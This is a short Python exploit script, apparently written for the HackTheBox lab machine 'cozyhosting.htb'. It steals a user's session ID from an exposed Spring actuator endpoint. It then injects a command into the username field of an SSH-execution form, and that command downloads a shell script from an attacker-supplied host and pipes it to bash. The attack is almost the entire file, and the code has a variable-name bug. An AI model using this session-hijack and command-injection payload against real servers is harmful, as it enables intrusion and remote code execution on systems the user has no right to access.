import sys
import requests
import json

if len(sys.argv) < 2:
    print(f"USAGE: {sys.argv[0]} HOST")
    sys.exit(1)

url = "http://cozyhosting.htb"

def get_session():
    result = requests.get(url + "/actuator/sessions")
    data= json.loads(res.text)
    for key, val in data.items():
        if val == "kanderson":
            return key
    return None

def get_shell():
    ssid = get_session()
    payload = {"host" : "10.10.10.10", "username" : ";$(curl${IFS}"+ sys.argv[1] + "/shell.sh|bash)"}
    cookies = {"JSESSIONID" : ssid}
    result = requests.post(url + "/executessh", cookies = cookies, data=payload)
    print(result.text)

if __name__ == "__main__":
    get_shell()